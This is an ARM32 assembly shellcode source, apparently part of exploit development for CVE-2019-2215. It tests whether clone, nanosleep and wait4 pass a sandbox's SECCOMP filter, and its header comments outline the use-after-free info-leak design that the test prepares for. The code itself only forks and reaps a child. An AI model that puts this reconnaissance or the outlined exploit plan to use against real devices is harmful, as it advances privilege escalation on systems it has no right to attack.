/*
 * clone_test.s — Test clone(SIGCHLD) for CVE-2019-2215 exploit feasibility
 * ARM32 EABI shellcode
 *
 * The UAF info leak requires two concurrent execution contexts:
 *   - Child: writev() blocks on full pipe, holding iovec in freed slab
 *   - Parent: triggers UAF via close(epoll_fd), reads leaked data
 *
 * This test verifies clone() is allowed by SECCOMP and that nanosleep/wait4
 * work for coordinating parent/child.
 *
 * Test sequence:
 *   1. clone(SIGCHLD, 0) — fork a child process
 *   2. Child: exit(0) immediately
 *   3. Parent: nanosleep(100ms)
 *   4. Parent: wait4(child_pid, WNOHANG) — reap zombie
 *
 * Return value (R0):
 *   0xCC00 | (child_pid & 0xFF) = clone + wait4 SUCCESS
 *   0xCE00 | (child_pid & 0xFF) = clone OK, wait4 returned 0 (not reaped yet)
 *   0xCF00 | errno              = clone OK, wait4 FAILED
 *   0xEE00 | errno              = clone FAILED (SECCOMP EPERM or other)
 *   Process killed               = SECCOMP RET_KILL on clone syscall
 *
 * Registers:
 *   R4 = child_pid (after clone)
 *   R7 = syscall number
 */

    .syntax unified
    .arch armv7-a
    .text
    .align 2
    .globl _start
    .type _start, %function

_start:
    push    {r4-r11, lr}
    sub     sp, sp, #32

    /* ── clone(SIGCHLD, 0, NULL, NULL, NULL) = fork() ── */
    mov     r0, #17         /* flags = SIGCHLD (exit signal) */
    mov     r1, #0          /* child_stack = NULL → use parent stack (COW) */
    mov     r2, #0          /* parent_tidptr = NULL */
    mov     r3, #0          /* tls = 0 */
    /* r4 (child_tidptr) is don't-care: CLONE_CHILD_SETTID not in flags */
    mov     r7, #120        /* __NR_clone */
    svc     #0

    cmp     r0, #0
    bmi     fail_clone
    beq     child_path

    /* ── Parent: r0 = child PID ── */
    mov     r4, r0          /* R4 = child_pid */

    /* nanosleep({0, 100000000}) — 100ms wait for child to exit */
    mov     r3, #0
    str     r3, [sp, #0]            /* tv_sec = 0 */
    ldr     r3, const_100ms_ns
    str     r3, [sp, #4]            /* tv_nsec = 100000000 */
    mov     r0, sp                  /* req = &timespec */
    mov     r1, #0                  /* rem = NULL */
    mov     r7, #162                /* __NR_nanosleep */
    svc     #0

    /* wait4(child_pid, &wstatus, WNOHANG, NULL) — reap zombie child */
    mov     r0, r4                  /* pid */
    add     r1, sp, #8              /* &wstatus */
    mov     r2, #1                  /* options = WNOHANG */
    mov     r3, #0                  /* rusage = NULL */
    mov     r7, #114                /* __NR_wait4 */
    svc     #0

    cmp     r0, #0
    bmi     wait_err                /* negative = wait4 error */
    beq     wait_zero               /* zero = child not exited yet */

    /* wait4 returned child_pid → child reaped successfully */
    and     r0, r4, #0xFF
    orr     r0, r0, #0xCC00         /* 0xCC = clone+wait SUCCESS */
    b       done

wait_zero:
    /* wait4 returned 0: child hasn't exited yet (WNOHANG) */
    and     r0, r4, #0xFF
    mov     r1, #0xCE00
    orr     r0, r0, r1              /* 0xCE = clone OK, not reaped */
    b       done

wait_err:
    /* wait4 returned -errno */
    rsb     r0, r0, #0              /* errno */
    mov     r1, #0xCF00
    orr     r0, r0, r1              /* 0xCF = clone OK, wait4 failed */
    b       done

child_path:
    /* ── Child process: exit immediately ── */
    mov     r0, #0
    mov     r7, #1                  /* __NR_exit */
    svc     #0
    /* unreachable */

fail_clone:
    /* clone returned -errno */
    rsb     r0, r0, #0              /* negate → errno */
    mov     r1, #0xEE00
    orr     r0, r0, r1              /* 0xEE = clone FAILED */
    b       done

done:
    add     sp, sp, #32
    pop     {r4-r11, pc}

    /* ── Data pool ── */
    .align 2
const_100ms_ns:
    .word   100000000               /* 100ms in nanoseconds = 0x05F5E100 */
